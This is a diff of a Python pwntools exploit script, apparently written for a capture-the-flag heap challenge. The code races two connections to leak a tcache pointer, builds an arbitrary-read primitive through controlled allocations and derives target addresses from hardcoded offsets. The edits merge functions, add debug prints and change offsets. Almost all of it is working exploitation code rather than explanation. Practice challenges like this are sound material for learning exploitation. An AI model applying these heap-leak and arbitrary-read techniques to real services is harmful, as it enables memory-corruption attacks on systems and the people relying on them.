@@ -9,7 +9,7 @@ def leak_tcache(r1, r2):
 		for _ in range(10000):
 			r1.sendline(b"malloc 0")
 			r1.sendline(b"scanf 0")
-			r1.sendline(b"A")
+			r1.sendline(b"AAAABBBB")
 			r1.sendline(b"free 0") # hope for write() of printf to go right after this
 		exit(0) # kills the child
 		
@@ -26,21 +26,15 @@ def leak_tcache(r1, r2):
 	for output in output_set: # checking if there's a leak like b'MESSAGE: \x00@^J\x07\x00\x00\x00' starting from '\x00'
 #		print(output[-1:])
 		output = output[9:]
-		if b'\x07' in output: # for bytes object, output[i] outputs integer
+		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
 		# output[:1] is just the very last byte
 
 			result = output[:6]
-			result = u64(result.ljust(8, b'\x00'))
-			
-			
-			print(p64(result)[:1])
-			if (p64(result)[:1] != b'\x00'):
-				result = result & ~0xff  # Clear the lowest 8 bits
-				
-			return result
+			print(result)
+			return u64(result.ljust(8, b'\x00'))
 	return 0
 idx = 2
-def controlled_allocations(r1, r2, addr, heap_base_addr):
+def arbitrary_read(r1, r2, addr, heap_base_addr):
 	global idx
 	r1.clean()
 	r2.clean()
@@ -84,19 +78,20 @@ def controlled_allocations(r1, r2, addr, heap_base_addr):
 	print("yo 2")
 	r1.clean()
 	print("yo 3")
-	idx += 2
-
-def arbitrary_read(r1, r2, addr, heap_base_addr):
-	controlled_allocations(r1, r2, addr, heap_base_addr)
-	r1.sendline(f"printf {idx - 1}".encode())
-
+	r1.sendline(f"printf {idx + 1}".encode())
+	print("yo 4")
 	r1.readuntil(b"MESSAGE: ")
+	print("yo 5")
+	print("About to read...")
 	output = r1.readline()[:-1]
 	
-
+	print(f"Raw received: {repr(output)}")
+	print("Address Read From: ", hex(u64(addr_packed)))
+	print(f"Hex: {output.hex()}")
+	print("yo 6")
 	leak = u64(output.ljust(8, b'\x00')) 
-
-
+	print("The leak is: ", hex(leak))
+	idx += 2
 	return leak
 	
 	
@@ -112,13 +107,18 @@ leak = leak_tcache(r1, r2)
 offset1 = 0x8a0 # from heap base 0x8a0 0xf20 0xd40	
 offset2 = 0x7ff640 # from second leak to base
 offset3 = 0x7fe8c0 # from base to last leak
-offset4 = 0x21b3c0  # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800
+offset4 = 0x41a3c0 # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800
 
 
 if leak:
 	print("tcache next pointer: ", hex(leak))
 	#print(f"\nGDB: gdb -p {p.pid}")
 	
+	print(p64(leak)[0:1])
+	if (p64(leak)[0:1] != b'\x00'):
+		print("hey")
+		leak = leak & ~0xff  # Clear the lowest 8 bits
+		print(hex(leak))
 		
 	print(hex((leak << 12) + offset1))
 	#pause()
@@ -156,12 +156,3 @@ else:
 
 
 p.kill()
-
-
-
-
-# this is too good
-# I think this is by far my favourite challenge
-# so fucking challenging and thus so fucking fun to learn with
-
-
